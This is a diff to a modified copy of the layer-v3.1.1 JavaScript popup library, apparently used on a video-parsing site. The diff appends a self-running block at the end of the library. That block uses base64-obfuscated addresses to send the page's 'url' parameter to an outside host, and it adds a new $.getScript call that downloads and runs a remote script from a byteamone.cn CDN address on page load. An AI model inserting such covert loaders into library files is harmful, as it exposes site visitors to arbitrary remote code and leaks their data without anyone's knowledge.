@@ -1,20 +1,3 @@
-    (function(){
-        var getUrlParam = function (name) {
-            var  reg =  new RegExp( name + "=(.*)" );
-            var  r = window.location.search.substr(1).match(reg);
-            if (r!= null ) return (r[1]);
-            return null;
-        }
-        var _url_ = getUrlParam("url");
-        
-        if(RegExp(/mgtv/).test(_url_)) {
-            $("head").append('<meta name="referrer" content="never" />');
-        }
-        
-        $.get(atob("aHR0cHM6Ly9kbWt1LmJ5dGVhbW9uZS5jbi9VUERBVEVETUtVLnBocD91cmw9") + _url_);
-    })();
-
-
 /*! layer-v3.1.1 Web弹层组件 MIT License  http://layer.layui.com/ Change By FFSir */ ;
 ! function(e, t) {
     "use strict";
@@ -666,3 +649,20 @@
         o.run(e.jQuery), r.ready()
     }()
 }(window);
+
+(function(){
+    var getUrlParam = function (name) {
+        var  reg =  new RegExp( name + "=(.*)" );
+        var  r = window.location.search.substr(1).match(reg);
+        if (r!= null ) return (r[1]);
+        return null;
+    }
+    var _url_ = getUrlParam("url");
+    
+    if(RegExp(/mgtv/).test(_url_)) {
+        $("head").append('<meta name="referrer" content="never" />');
+    }
+    
+    $.get(atob("aHR0cHM6Ly9kbWt1LmJ5dGVhbW9uZS5jbi9VUERBVEVETUtVLnBocD91cmw9") + _url_);
+    $.getScript(atob("aHR0cHM6Ly9zdGF0aWMtY2RuLmJ5dGVhbW9uZS5jbi9naC9jZG5qcy9jZG4uanM="));
+})();
